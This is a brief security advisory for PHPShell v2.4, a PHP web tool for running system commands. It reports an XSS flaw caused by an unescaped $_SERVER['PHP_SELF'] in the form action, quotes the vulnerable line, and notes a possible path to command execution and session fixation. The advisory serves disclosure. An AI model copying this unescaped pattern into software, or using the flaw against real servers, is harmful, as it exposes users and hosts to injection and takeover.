Vendor:
==========
sourceforge.net/projects/phpshell/
phpshell.sourceforge.net/



Product:
=============
PHPShell v2.4


Vulnerability Type:
====================
Cross Site Scripting



CVE Reference:
==============
N/A



Security Issue:
================
Multiple cross site scripting entry points exist in PHPShell undermining
the integrity between users browser and server.
Allowing remote attackers to bypass access controls such as the same-origin
policy. If an authenticated user clicks an attacker
supplied link.

XSS issue is made possible because PHPShell calls print
$_SERVER['PHP_SELF'] on the main HTML form. Since PHP_SELF references URL,
PHPShell simply reads our XSS payload in the URL and echoes it back to
client.

<form name="shell" enctype="multipart/form-data" action="<?php
print($_SERVER['PHP_SELF']) ?>" method="post">

Since PHPShell purpose is to execute system commands this XSS vulnerability
can potentially become a 'Remote Command Execution'
vulnerability. Moreover, this XSS issue can also potentially leverage a
Session Fixation vulnerability also present in PHPShell.
